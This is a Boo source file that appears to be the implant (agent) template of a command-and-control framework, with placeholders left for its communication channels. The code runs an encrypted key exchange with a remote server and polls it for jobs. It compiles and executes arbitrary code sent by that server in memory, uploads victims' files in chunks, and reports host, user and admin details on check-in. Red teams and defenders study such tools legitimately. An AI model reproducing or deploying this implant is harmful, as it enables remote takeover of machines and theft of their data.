import System
import System.Environment
import System.Globalization
import System.Reflection
import System.Text
import System.IO
import System.IO.Compression
import System.Threading
import System.Diagnostics
import System.Net
import System.Net.Security
import System.Net.NetworkInformation
import System.Security.Cryptography
import System.Security.Principal
import System.Web.Script.Serialization
import Boo.Lang.Compiler
import Boo.Lang.Compiler.IO
import Boo.Lang.Compiler.Pipelines
import Microsoft.VisualBasic.Devices
import Microsoft.Win32

ASSEMBLY_RESOLVE_EVENT_HANDLER_GOES_HERE

public def urljoin(*args) as string:
    t = map(args) def (arg as object):
        return arg.ToString().TrimEnd(*"/".ToCharArray()).Trim(*"/".ToCharArray())
    return join(t, "/")

public def gen_random_string() as string:
    return Guid.NewGuid().ToString("n").Substring(0, 8)

public def Hex2Binary(hex as string) as (byte):
    chars = hex.ToCharArray()
    bytes = List[of byte]()

    index = 0
    while index < chars.Length:
        chunk = string(chars, index, 2)
        bytes.Add(byte.Parse(chunk, NumberStyles.AllowHexSpecifier))
        index += 2

    return bytes.ToArray()

class CryptoException(Exception):
    def constructor(message):
        super(message)

class CommsException(Exception):
    def constructor(message):
        super(message)

class CompilationException(Exception):
    def constructor(message):
        super(message)

class Args:
    public args as List
    public source as string
    public references as List
    public run_in_thread as bool = true

class JsonJob:
    public id as string
    public cmd as string
    public args as Args

#
#
# Comms Section
#
#

PUT_COMMS_HERE

#
# End Comms Section
#
#

public class FileChunker:
    public static def CompressFile(file_to_open as string) as string:
        compressed_file_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "$(Path.GetFileName(file_to_open)).gzip")
        using source_file = File.OpenRead(file_to_open):
            using dest_stream = File.Create(compressed_file_path):
                using compressed_dest_file = GZipStream(dest_stream, CompressionLevel.Optimal):
                    source_file.CopyTo(compressed_dest_file)

        return compressed_file_path

    public static def ReadStream(input as Stream) as (byte):
        buffer as (byte)
        buffer = array(byte, 81920)
        if (input.Length - input.Position) < 81920:
            buffer = array(byte, (input.Length - input.Position))

        input.Read(buffer, 0, buffer.Length)
        return buffer
    
    public static def ReadBytes(input as (byte), chunk as int) as (byte):
        if input.Length < 81920:
            return input

        start = 81920 * (chunk - 1)
        end = start + 81920
        return input[start:end]

class Crypto:
    private _PSK as (byte)
    private derivedKey as (byte)
    private serverPubKey as ECDiffieHellmanCngPublicKey
    private asymAlgo as ECDiffieHellmanCng = ECDiffieHellmanCng()

    public PSK:
        set:
            _PSK = Hex2Binary(value)

    public PubKey:
        get:
           return asymAlgo.PublicKey.ToXmlString()

    public EncryptedPubKey:
        get:
            return Encrypt(asymAlgo.PublicKey.ToXmlString(), _PSK)

    public def DeriveKey(encryptedServerPubKey as (byte)):
        serverPubKey = ECDiffieHellmanCngPublicKey.FromXmlString(
            Encoding.UTF8.GetString(
                Decrypt(encryptedServerPubKey, _PSK)
            )
        )
        derivedKey = asymAlgo.DeriveKeyMaterial(serverPubKey)

    private def HMAC(key as (byte), message as (byte)) as (byte):
        using hmac = HMACSHA256(key):
            return hmac.ComputeHash(message)

    private def AesEncryptData(cleartext as (byte), key as (byte), iv as (byte)) as (byte):
        using aesAlg = Aes.Create():
            aesAlg.Padding = PaddingMode.PKCS7
            aesAlg.KeySize = 256
            aesAlg.Key = key
            aesAlg.IV = iv

            encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV)

            using encryptedData = MemoryStream():
                using cryptoStream = CryptoStream(encryptedData, encryptor, CryptoStreamMode.Write):
                    cryptoStream.Write(cleartext, 0, cleartext.Length)
                    cryptoStream.FlushFinalBlock()
                    return encryptedData.ToArray()

    private def AesDecryptData(ciphertext as (byte), key as (byte), iv as (byte)) as (byte):
        using aesAlg = Aes.Create():
            aesAlg.Padding = PaddingMode.PKCS7
            aesAlg.KeySize = 256
            aesAlg.Key = key
            aesAlg.IV = iv

            decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV)

            using decryptedData = MemoryStream():
                using cryptoStream = CryptoStream(decryptedData, decryptor, CryptoStreamMode.Write):
                    cryptoStream.Write(ciphertext, 0, ciphertext.Length)
                    cryptoStream.FlushFinalBlock()
                    return decryptedData.ToArray()

    public def Encrypt(data as (byte)) as (byte):
        iv = array(byte, 16)
        RNGCryptoServiceProvider().GetBytes(iv)

        ciphertext = AesEncryptData(data, derivedKey, iv)
        hmac = HMAC(derivedKey, iv + ciphertext)

        return iv + ciphertext + hmac

    public def Encrypt(data as string) as (byte):
        return Encrypt(Encoding.UTF8.GetBytes(data))

    public def Encrypt(data as (byte), key as (byte)):
        iv = array(byte, 16)
        RNGCryptoServiceProvider().GetBytes(iv)

        ciphertext = AesEncryptData(data, key, iv)
        hmac = HMAC(key, iv + ciphertext)

        return iv + ciphertext + hmac

    public def Encrypt(data as string, key as (byte)) as (byte):
        return Encrypt(Encoding.UTF8.GetBytes(data), key)

    public def Decrypt(data as (byte)):
        iv, ciphertext, hmac = data[:16], data[16:-32], data[-32:]

        if hmac == HMAC(derivedKey, iv + ciphertext):
            return AesDecryptData(ciphertext, derivedKey, iv)

        raise CryptoException("Invalid HMAC when decrypting data")

    public def Decrypt(data as (byte), key as (byte)):
        iv, ciphertext, hmac = data[:16], data[16:-32], data[-32:]

        if hmac == HMAC(key, iv + ciphertext):
            return AesDecryptData(ciphertext, key, iv)

        raise CryptoException("Invalid HMAC when decrypting data")

class STJob:
    public id as string
    public cmd as string
    public result as duck
    public error as bool = false
    private StartTime as DateTime = DateTime.Now
    private EndTime as DateTime
    private Job as JsonJob
    private Client as STClient
    private sw as Stopwatch = Stopwatch()
    private _t as Thread

    public elapsedjobtime:
        get:
            ts = sw.Elapsed
            return String.Format("{0:00}:{1:00}:{2:00}", ts.Hours, ts.Minutes, ts.Seconds)

    def constructor(job as JsonJob, client as STClient):
        Client = client
        Job = job

        id = Job.id
        cmd = Job.cmd
        if Client.Debug:
            print id, cmd

        if Job.args.run_in_thread:
            Start.BeginInvoke(null, null)
        else:
            Start()

    /*
        if Job.args.run_in_thread:
            _t as Thread = Thread() do:
                Start()
            t.Start()
        else:
            Start()

        type = self.GetType()
        method as duck = type.GetMethod(Cmd).GetType()
        method.BeginInvoke(callback, null)

    def callback(result as IAsyncResult):
        sw.Stop()
        EndTime = DateTime.Now
        print("callback: $(Start.EndInvoke(result)), elapsed: $(sw.Elapsed.Seconds), Started: $(StartTime), ended: $(EndTime)")

    */

    public def Stop():
        _t.Abort()
        sw.Stop()
        EndTime = DateTime.Now

    public def Start() as string:
        try:
            if cmd == 'CheckIn':
                result = CheckIn()
            elif cmd == 'CompileAndRun':
                result = CompileAndRun(Job.args.source, Job.args.references)
            elif cmd == 'Exit':
                result = Exit()
            elif cmd == 'Sleep':
                result = Sleep(Job.args.args[0])  # I hate this shit, but for now it'll do
            elif cmd == 'Upload':
                result = Upload(Job.args.args[0])
            #elif cmd == 'Jobs':
            #    result = Jobs(Job.args.args[0])
            elif cmd == 'Jitter':
                if len(Job.args.args) == 2:
                    result = Jitter(Job.args.args[0], Job.args.args[1])
                else:
                    result = Jitter(Job.args.args[0], 0)
        except e as Exception:
            error = true
            result = "$(e)"

        sw.Stop()
        EndTime = DateTime.Now

        Client.SendJobResults(self)

    /*
    public def Jobs(command as string, jobId as string):
        if command == 'list':
            for job in Client.Job:

        elif command == 'kill':
            job = Client.Jobs.Find({j | return j.id == jobId})
            if job:
                job.Stop()

        elif command == 'restart':
            job = Client.Jobs.Find({j | return j.id == jobId})
            if job:
                job.Start()
    */

    public def CheckIn() as Hash:
         return JavaScriptSerializer().Deserialize[of Hash](JavaScriptSerializer().Serialize(Client))

    public def Exit() as int:
        Environment.Exit(0)
        return 0

    public def Sleep(time as int) as string:
        Client.Sleep = time
        return "Will now check-in every $(Client.Sleep)ms"

    public def Jitter(maxJitter as int, minJitter as int) as string:
        Client.MaxJitter = maxJitter
        Client.MinJitter = minJitter
        return "Will now check-in every $(Client.Sleep)ms with a max jitter of $(maxJitter)ms and a min jitter of $(minJitter)ms"

    public def Upload(file_path as string) as string:
        compressed_file =  FileChunker.CompressFile(file_path)
        using source_file = File.OpenRead(compressed_file):
            current_chunk_n = 1
            chunk_n = source_file.Length / 81920
            bytes_to_send = FileChunker.ReadStream(source_file)
            while (source_file.Length - source_file.Position) > 0:
                if Client.Debug:
                    print "[*] Sending chunk $(current_chunk_n)/$(chunk_n), bytes remaining: $(source_file.Length - source_file.Position)"

                result = {
                    "chunk_n": chunk_n,
                    "current_chunk_n": current_chunk_n,
                    "data": Convert.ToBase64String(bytes_to_send)
                }
                Client.SendJobResults(self)
                Thread.Sleep(Client.GetSleepAndJitter())

                bytes_to_send = FileChunker.ReadStream(source_file)
                current_chunk_n += 1

            if Client.Debug:
                print "[*] Sending FINAL chunk $(current_chunk_n), bytes remaining: $(source_file.Length - source_file.Position)"

            result = {
                "chunk_n": chunk_n,
                "current_chunk_n": current_chunk_n,
                "data": Convert.ToBase64String(bytes_to_send)
            }
            Client.SendJobResults(self)

        return "Sent File"

    public def UploadAsBytes(source_file as (byte), filename as string) as string:
        current_chunk_n = 1
        chunk_n = source_file.Length / 81920
        bytes_to_send = FileChunker.ReadBytes(source_file, current_chunk_n)
        while bytes_to_send.Length == 81920:
            if Client.Debug:
                print "[*] Sending chunk $(current_chunk_n)/$(chunk_n), bytes remaining: $(source_file.Length - (bytes_to_send.Length * (current_chunk_n - 1)))"           
            
            result = {
                "chunk_n": chunk_n,
                "current_chunk_n": current_chunk_n,
                "data": Convert.ToBase64String(bytes_to_send),
                "filename": filename
            }
            Client.SendJobResults(self)
            Thread.Sleep(Client.GetSleepAndJitter())

            current_chunk_n += 1
            bytes_to_send = FileChunker.ReadBytes(source_file, current_chunk_n)

        if Client.Debug:
            print "[*] Sending FINAL chunk $(current_chunk_n), bytes remaining: $(bytes_to_send.Length)" 

        result = {
            "chunk_n": chunk_n,
            "current_chunk_n": current_chunk_n,
            "data": Convert.ToBase64String(bytes_to_send),
            "filename": filename
        }
        Client.SendJobResults(self)
        return "Sent File"

    public def CompileAndRun(source as string, references as List) as string:
        #print("Received source: \n $source")
        parameters = CompilerParameters(false)
        parameters.Input.Add( StringInput("$(id).boo", source) )
        parameters.Pipeline = CompileToMemory()
        parameters.Ducky = true

        parameters.AddAssembly(Assembly.LoadWithPartialName("Boo.Lang"))
        parameters.AddAssembly(Assembly.LoadWithPartialName("Boo.Lang.Extensions"))
        parameters.AddAssembly(Assembly.LoadWithPartialName("Boo.Lang.Parser"))
        parameters.AddAssembly(Assembly.LoadWithPartialName("Boo.Lang.Compiler"))
        parameters.AddAssembly(Assembly.LoadWithPartialName("mscorlib"))
        parameters.AddAssembly(Assembly.LoadWithPartialName("System"))
        parameters.AddAssembly(Assembly.LoadWithPartialName("System.Core"))

        #https://github.com/boo-lang/boo/blob/10cfbf08e0f5568220bc621606a3e49d48dc69a5/src/booc/CommandLineParser.cs#L834-L839
        for r in references:
            parameters.AddAssembly(Assembly.LoadWithPartialName(r))

        compiler = BooCompiler(parameters)
        context = compiler.Run()

        if context.GeneratedAssembly is null:
            error = true
            return "Error compiling source:\n$(join(e for e in context.Errors, '\n'))"
        else:
            /*
            for t in context.GeneratedAssembly.GetTypes():
                print t.Name
            */

            if char.IsDigit(id[0]):
                typeName = "_$(id)Module"
            else:
                typeName = "$(char.ToUpper(id[0]) + id.Substring(1))Module"

            module as duck = context.GeneratedAssembly.GetType(typeName)

            try:
                using scriptOutput = StringWriter():
                    Console.SetOut(scriptOutput)
                    Console.SetError(scriptOutput)
                    #Call the Main function in the compiled assembly if available else call Start
                    try:
                        module.Main()
                    except MissingMethodException:
                        module.Start(self)

                    scriptOutput.Flush()
                    return scriptOutput.ToString()
            ensure:
                standardOutput = StreamWriter(Console.OpenStandardOutput())
                standardOutput.AutoFlush = true
                Console.SetOut(standardOutput)

                standardError = StreamWriter(Console.OpenStandardError())
                standardError.AutoFlush = true
                Console.SetError(standardError)

    public def SendJobResults(output as string):
        result = output
        Client.SendJobResults(self)

class STClient:
    public Jobs as List = []
    public Channels as List = [PUT_COMM_CLASSES_HERE]
    public Sleep as int = 5000
    public MaxJitter as int = 0
    public MinJitter as int = 0
    public Username = Environment.UserName
    public Domain = Environment.UserDomainName
    public DotNetVersion = Environment.Version.ToString()
    public Os = "$(ComputerInfo().OSFullName) $(Environment.OSVersion.Version)"
    public OsReleaseId = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", "")
    public Hostname = Environment.MachineName
    public Debug as bool = true
    private _Guid as Guid
    private _PSK as string
    private _Crypto as Crypto

    public PSK:
        set:
            _PSK = value

    public Guid:
        set:
            _Guid = value
            for ch as duck in Channels:
                ch.Guid = value
        get:
            return _Guid

    public Urls:
        set:
            for url in value:
                for ch as duck in Channels:
                    if @/:\/\//.Split(url)[0] == ch.GetType().Name.ToLower():
                        ch.SetCallBackUrl(url)

    public OsArch:
        get:
            if IntPtr.Size == 8:
                return "x64"
            return "x86"

    public ProcessId:
        get:
            return Process.GetCurrentProcess().Id

    public ProcessName:
        get:
            return Process.GetCurrentProcess().ProcessName

    public HighIntegrity:
        get:
            identity = WindowsIdentity.GetCurrent()
            principal = WindowsPrincipal(identity)
            return principal.IsInRole(WindowsBuiltInRole.Administrator)

    public NetworkAddresses:
        get:
            addresses = []
            interfaces = NetworkInterface.GetAllNetworkInterfaces()
            for iface in interfaces:
                properties = iface.GetIPProperties()
                addresses.Extend([uni.Address.ToString() for uni in properties.UnicastAddresses if uni.Address.AddressFamily.ToString() == "InterNetwork" and uni.Address.ToString() != '127.0.0.1'])
            return addresses

    public def GetSleepAndJitter() as int:
        if MinJitter > 0 and MaxJitter > 0:
            return Sleep + Random().Next(MinJitter, MaxJitter)
        elif MaxJitter > 0:
            return Sleep + Random().Next(MaxJitter)

        return Sleep

    public def DoKex():
        _Crypto = Crypto(PSK: _PSK)
        encryptedPubKey = _Crypto.EncryptedPubKey

        while true:
            for channel as duck in Channels:
                try:
                    encryptedServerPubKey = channel.KeyExchange(encryptedPubKey)
                    _Crypto.DeriveKey(encryptedServerPubKey)
                    return
                except e as Exception:
                    if Debug:
                        print "[Channel: $(channel.Name)] Error performing key exchange: $(e.Message)"
                    Thread.Sleep(GetSleepAndJitter())
                    continue
            #Thread.Sleep(GetSleepAndJitter())

    public def Start():
        DoKex()
        while true:
            for channel as duck in Channels:
                try:
                    encrypted_job = channel.GetJob()
                    #encrypted_job = channel.GetJob.EndInvoke(job_thread)
                    if len(encrypted_job) > 0:
                        decrypted_job = Encoding.UTF8.GetString( _Crypto.Decrypt(encrypted_job) )
                        job = JavaScriptSerializer().Deserialize[of JsonJob](decrypted_job)
                        Jobs.Add(STJob(job, self))
                except e as Exception:
                    if Debug:
                        print "[Channel: $(channel.Name)] Error retrieving tasking: $(e.Message)"
                    DoKex()
                    Thread.Sleep(GetSleepAndJitter())
                    continue
            Thread.Sleep(GetSleepAndJitter())

    public def SendJobResults(job as STJob):
        for channel as duck in Channels:
            payload = _Crypto.Encrypt(JavaScriptSerializer().Serialize(job))
            try:
                channel.SendJobResults(payload, job.id)
                return
            except e as Exception:
                if Debug:
                    print "Error sending job (id: $(job.id)) results with $(channel.Name) channel: $(e.Message)"
                #Thread.Sleep(GetSleepAndJitter())
                continue
            #Thread.Sleep(GetSleepAndJitter())

public static def Main(argv as (string)):
    ASSEMBLY_RESOLVE_HOOK_GOES_HERE
    client = STClient(Guid: Guid(argv[0]), PSK: argv[1], Urls: @/,/.Split(argv[2]))
    #client.Jobs.Add(STJob(JsonJob(id: "test", cmd: "Upload"), client))
    client.Start()

    /*
    source = """
import System.Threading
public static def Main():
    print 'What the hell are you talking about?'
    Thread.Sleep(10000)
"""
    client.Jobs.Add(STJob(source))

    #print client.NetworkAddresses, client.HighIntegrity, client.ProcessId, client.ProcessName, client.OsArch

    currentAsm = Assembly.GetExecutingAssembly()
    for f in currentAsm.GetManifestResourceNames():
        using reader = StreamReader(currentAsm.GetManifestResourceStream(f)):
            asm as duck = STJob.Compile(reader.ReadToEnd()).GetType("ScriptModule")
            comms = asm.Comms(client, "http://127.0.0.1:8080/")
    */
